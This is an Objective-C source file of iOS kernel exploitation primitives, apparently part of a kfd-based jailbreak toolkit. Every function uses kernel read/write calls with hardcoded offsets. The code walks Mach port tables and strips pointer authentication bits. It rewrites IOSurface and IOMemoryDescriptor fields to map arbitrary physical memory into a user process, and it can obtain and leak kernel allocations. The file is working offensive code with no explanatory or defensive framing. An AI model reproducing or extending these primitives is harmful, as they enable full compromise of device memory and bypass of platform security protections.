#include "IOSurface_Primitives.h"

uint64_t IOSurfaceRootUserClient_get_surfaceClientById(uint64_t rootUserClient, uint32_t surfaceId)
{
    uint64_t surfaceClientsArray = kread64_ptr_kfd(rootUserClient + 0x118);
    return kread64_ptr_kfd(surfaceClientsArray + (sizeof(uint64_t)*surfaceId));
}

uint64_t IOSurfaceClient_get_surface(uint64_t surfaceClient)
{
    return kread64_ptr_kfd(surfaceClient + 0x40);
}

uint64_t IOSurfaceSendRight_get_surface(uint64_t surfaceSendRight)
{
    return kread64_ptr_kfd(surfaceSendRight + 0x18);
}

uint64_t IOSurface_get_ranges(uint64_t surface)
{
    return kread64_ptr_kfd(surface + 0x3e0);
}

void IOSurface_set_ranges(uint64_t surface, uint64_t ranges)
{
    kwrite64_kfd(surface + 0x3e0, ranges);
}

uint64_t IOSurface_get_memoryDescriptor(uint64_t surface)
{
    return kread64_ptr_kfd(surface + 0x38);
}

uint64_t IOMemoryDescriptor_get_ranges(uint64_t memoryDescriptor)
{
    return kread64_ptr_kfd(memoryDescriptor + 0x60);
}

uint64_t IOMemorydescriptor_get_size(uint64_t memoryDescriptor)
{
    return kread64_kfd(memoryDescriptor + 0x50);
}

void IOMemoryDescriptor_set_size(uint64_t memoryDescriptor, uint64_t size)
{
    kwrite64_kfd(memoryDescriptor + 0x50, size);
}

void IOMemoryDescriptor_set_wired(uint64_t memoryDescriptor, bool wired)
{
    kwrite8_kfd(memoryDescriptor + 0x88, wired);
}

uint32_t IOMemoryDescriptor_get_flags(uint64_t memoryDescriptor)
{
    return kread32_kfd(memoryDescriptor + 0x20);
}

void IOMemoryDescriptor_set_flags(uint64_t memoryDescriptor, uint32_t flags)
{
    kwrite8_kfd(memoryDescriptor + 0x20, flags);
}

void IOMemoryDescriptor_set_memRef(uint64_t memoryDescriptor, uint64_t memRef)
{
    kwrite64_kfd(memoryDescriptor + 0x28, memRef);
}

uint64_t IOSurface_get_rangeCount(uint64_t surface)
{
    return kread64_ptr_kfd(surface + 0x3e8);
}

void IOSurface_set_rangeCount(uint64_t surface, uint32_t rangeCount)
{
    kwrite32_kfd(surface + 0x3e8, rangeCount);
}

mach_port_t IOSurface_map_getSurfacePort(uint64_t magic)
{
    if (@available(iOS 11.0, *)) {
        IOSurfaceRef surfaceRef = IOSurfaceCreate((__bridge CFDictionaryRef)@{
            (__bridge NSString *)kIOSurfaceWidth : @120,
            (__bridge NSString *)kIOSurfaceHeight : @120,
            (__bridge NSString *)kIOSurfaceBytesPerElement : @4,
        });
        mach_port_t port = IOSurfaceCreateMachPort(surfaceRef);
        *((uint64_t *)IOSurfaceGetBaseAddress(surfaceRef)) = magic;
        IOSurfaceDecrementUseCount(surfaceRef);
        CFRelease(surfaceRef);
        return port;
    } else {
        // Fallback on earlier versions
    }
    return MACH_PORT_NULL;
}

uint64_t ipc_find_port(mach_port_t port_name)
{
    uint64_t pr_task = get_current_task();
    uint64_t itk_space_pac = kread64_kfd(pr_task + off_task_itk_space);
    uint64_t itk_space = itk_space_pac | 0xffffff8000000000;
    uint32_t port_index = MACH_PORT_INDEX(port_name);
    
    uint64_t is_table = kread64_smr_kfd(itk_space + off_ipc_space_is_table);
    uint64_t entry = is_table + port_index * 0x18/*SIZE(ipc_entry)*/;
    uint64_t object_pac = kread64_kfd(entry + off_ipc_entry_ie_object);
    uint64_t object = object_pac | 0xffffff8000000000;
    
    return object;
}

uint64_t ipc_entry_lookup(mach_port_name_t port_name)
{
    uint64_t object = ipc_find_port(port_name);
    uint64_t kobject_pac = kread64_kfd(object + off_ipc_port_ip_kobject);
    uint64_t kobject = kobject_pac | 0xffffff8000000000;
    
    return kobject;
}

void *IOSurface_map(uint64_t phys, uint64_t size)
{
    if (@available(iOS 11.0, *)) {
        mach_port_t surfaceMachPort = IOSurface_map_getSurfacePort(1337);
        
        uint64_t surfaceSendRight = ipc_entry_lookup(surfaceMachPort);
        uint64_t surface = IOSurfaceSendRight_get_surface(surfaceSendRight);
        uint64_t desc = IOSurface_get_memoryDescriptor(surface);
        uint64_t ranges = IOMemoryDescriptor_get_ranges(desc);
        
        kwrite64_kfd(ranges, phys);
        kwrite64_kfd(ranges+8, size);
        
        IOMemoryDescriptor_set_size(desc, size);
        
        kwrite64_kfd(desc + 0x70, 0);
        kwrite64_kfd(desc + 0x18, 0);
        kwrite64_kfd(desc + 0x90, 0);
        
        IOMemoryDescriptor_set_wired(desc, true);
        
        uint32_t flags = IOMemoryDescriptor_get_flags(desc);
        IOMemoryDescriptor_set_flags(desc, (flags & ~0x410) | 0x20);
        
        IOMemoryDescriptor_set_memRef(desc, 0);
        
        IOSurfaceRef mappedSurfaceRef = IOSurfaceLookupFromMachPort(surfaceMachPort);
        return IOSurfaceGetBaseAddress(mappedSurfaceRef);
    } else {
        return NULL;
    }
}

static mach_port_t IOSurface_kalloc_getSurfacePort(uint64_t size)
{
    if (@available(iOS 11.0, *)) {
        uint64_t allocSize = 0x10;
        uint64_t *addressRangesBuf = (uint64_t *)malloc(size);
        memset(addressRangesBuf, 0, size);
        addressRangesBuf[0] = (uint64_t)malloc(allocSize);
        addressRangesBuf[1] = allocSize;
        NSData *addressRanges = [NSData dataWithBytes:addressRangesBuf length:size];
        free(addressRangesBuf);
        
        IOSurfaceRef surfaceRef = IOSurfaceCreate((__bridge CFDictionaryRef)@{
            @"IOSurfaceAllocSize" : @(allocSize),
            @"IOSurfaceAddressRanges" : addressRanges,
        });
        mach_port_t port = IOSurfaceCreateMachPort(surfaceRef);
        IOSurfaceDecrementUseCount(surfaceRef);
        return port;
    } else {
        return MACH_PORT_NULL;
    }
}

uint64_t IOSurface_kalloc(uint64_t size, bool leak)
{
    while (true) {
        mach_port_t surfaceMachPort = IOSurface_kalloc_getSurfacePort(size);

        uint64_t surfaceSendRight = ipc_entry_lookup(surfaceMachPort);
        uint64_t surface = IOSurfaceSendRight_get_surface(surfaceSendRight);
        uint64_t va = IOSurface_get_ranges(surface);

        if (va == 0) continue;

        if (leak) {
            IOSurface_set_ranges(surface, 0);
            IOSurface_set_rangeCount(surface, 0);
        }

        return va;
    }

    return 0;
}
